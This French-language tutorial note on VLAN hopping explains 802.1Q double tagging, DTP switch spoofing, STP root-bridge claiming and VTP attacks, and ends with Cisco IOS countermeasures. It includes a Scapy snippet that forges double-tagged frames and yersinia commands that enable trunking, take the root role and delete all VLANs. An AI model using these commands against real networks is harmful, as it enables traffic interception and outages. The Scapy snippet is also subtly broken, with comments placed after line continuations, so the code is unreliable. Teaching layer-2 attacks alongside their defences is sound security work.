---
title: VLAN Hopping
domain: sciences-appliquées
subdomain: informatique / sécurité / réseau / sécurité réseau
tags: [vlan, hopping, réseau, switch, 802.1q, sécurité, pentest]
date: 2026-03-22
---

# VLAN Hopping

Le VLAN hopping permet à un attaquant de sortir de son VLAN d'origine pour accéder au trafic d'autres VLANs, contournant ainsi la segmentation réseau. Deux techniques principales existent : le Double Tagging et le Switch Spoofing.

## Rappel VLAN et 802.1Q

```
VLAN (Virtual LAN) : segmentation logique d'un réseau physique
  → Chaque VLAN = domaine de broadcast isolé
  → Communication inter-VLAN nécessite un routeur ou un firewall

802.1Q : protocole de tagging VLAN
  → Ajoute un tag 4 octets dans l'en-tête Ethernet
  → Format : [EtherType 0x8100] [PCP 3 bits] [DEI 1 bit] [VLAN ID 12 bits]

Access port : port switchport en mode access — un seul VLAN, pas de tag visible pour l'hôte
Trunk port  : port switchport en mode trunk — transporte plusieurs VLANs tagués
Native VLAN : VLAN dont les trames passent sur un trunk SANS tag (défaut : VLAN 1)
```

## Technique 1 — Double Tagging

Exploite le fait que le native VLAN est envoyé sans tag sur les trunks, et que certains switches "dépouillent" le premier tag 802.1Q.

```
Conditions nécessaires :
1. L'attaquant est connecté sur le même VLAN que le native VLAN du trunk (ex: VLAN 1)
2. Le switch utilise IEEE 802.1Q avec un native VLAN non sécurisé

Mécanisme :
                    Attaquant (VLAN 1)
                           |
                      Switch A
                     (trunk vers Switch B, native VLAN 1)
                           |
                      Switch B
                           |
                   Victime (VLAN 10)

1. Attaquant envoie une trame avec DEUX tags 802.1Q :
   [Ethernet header][Tag VLAN 1 (outer)][Tag VLAN 10 (inner)][payload]

2. Switch A reçoit la trame sur le port access VLAN 1
   → Voit le tag outer VLAN 1 → c'est le native VLAN → supprime ce tag
   → Envoie sur le trunk avec seulement le tag inner VLAN 10

3. Switch B reçoit la trame avec le tag VLAN 10
   → La livre sur les ports VLAN 10

Limitation : unidirectionnel — la réponse de la victime ne passe pas par ce chemin
(sauf si on utilise un proxy ou un C2 dans la DMZ)
```

```bash
# Scapy — forger une trame double-taggée
from scapy.all import *

# Trame double-taggée : outer VLAN 1, inner VLAN 10
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=1) / \              # Outer tag (native VLAN)
      Dot1Q(vlan=10) / \             # Inner tag (VLAN cible)
      IP(dst="192.168.10.1") / \
      ICMP()

sendp(pkt, iface="eth0")

# Créer une interface vlan et envoyer
# Ou utiliser vconfig/ip link pour créer des sous-interfaces
```

## Technique 2 — Switch Spoofing (DTP)

Exploite le protocole DTP (Dynamic Trunking Protocol) de Cisco qui permet à un switch de négocier automatiquement le mode trunk.

```
Conditions nécessaires :
  Le port est configuré en mode "dynamic desirable" ou "dynamic auto"
  (accepte les requêtes DTP)

Mécanisme :
1. L'attaquant envoie des paquets DTP (Dynamic Trunking Protocol)
   simulant un switch qui veut établir un trunk
2. Le switch légitime répond et établit un trunk
3. L'attaquant reçoit maintenant les trames de TOUS les VLANs

yersinia -G  # Interface graphique (attaque DTP intégrée)
```

```bash
# yersinia — outil d'attaque sur les protocoles réseau de couche 2
yersinia -I                    # Mode interactif
# h → protocoles disponibles (DTP, STP, VTP, CDP, DHCP...)

# Attaque DTP en mode interactif
yersinia dtp -attack 1         # Enable trunking

# En ligne de commande
yersinia -G   # GUI GTK
# Sélectionner DTP → Enabling trunk

# Scapy — forger des paquets DTP
# (moins courant, nécessite de reverse-engineer le protocole)
```

## STP Attacks (Spanning Tree Protocol)

Bien que distinct du VLAN hopping, STP abuse peut permettre de devenir Root Bridge et intercepter le trafic.

```bash
# Si l'attaquant peut envoyer des BPDUs avec une priorité très basse
# → Devient Root Bridge → tout le trafic passe par lui

yersinia stp -attack 0         # Claiming Root Role
# ou
yersinia -G  # → STP → Claiming Root Role

# Impact : MITM sur tout le traffic de niveau 2 du réseau
# Peut entraîner des interruptions de service (reconvergence STP)
```

## VTP Attacks (VLAN Trunking Protocol)

```bash
# VTP permet de propager la configuration VLAN à tous les switches du domaine
# Si l'attaquant peut envoyer des paquets VTP avec un numéro de révision élevé
# → Écrase la configuration VLAN de tous les switches → DoS ou pivoting

yersinia vtp -attack 1         # Deleting all VLANs (DoS)
yersinia vtp -attack 2         # Adding a VLAN
```

## Contre-mesures

```
Protection contre le Double Tagging :
  ✓ Changer le native VLAN vers un VLAN dédié (ex: VLAN 999) sans hôtes
  ✓ Les hôtes utilisateurs ne doivent JAMAIS être sur le native VLAN
  ✓ Activer le "dot1q tag native" (force le tagging du native VLAN sur les trunks)

  Cisco IOS :
  vlan 999                              ! VLAN dédié pour native
  interface GigabitEthernet0/1
    switchport trunk native vlan 999   ! Trunk : native VLAN = 999

Protection contre le Switch Spoofing (DTP) :
  ✓ Désactiver DTP sur tous les ports access (mode static)

  Cisco IOS :
  interface GigabitEthernet0/1
    switchport mode access             ! Port access statique
    switchport nonegotiate             ! Désactiver DTP
    switchport access vlan 10

Protection STP :
  ✓ PortFast + BPDU Guard sur les ports access
  ✓ Root Guard sur les ports vers des switches non fiables

  interface GigabitEthernet0/1
    spanning-tree portfast
    spanning-tree bpduguard enable

Protection VTP :
  ✓ VTP mode transparent ou off sur les switches d'accès
  ✓ Mot de passe VTP
  ✓ Migrer vers VTP v3 (support d'authentification)

Général :
  ✓ Segmenter les VLANs sensibles avec des firewalls (pas seulement des ACL)
  ✓ Désactiver les ports inutilisés et les mettre dans un VLAN "black hole"
  ✓ 802.1X (authentification des ports) → seuls les équipements authentifiés accèdent au réseau
```
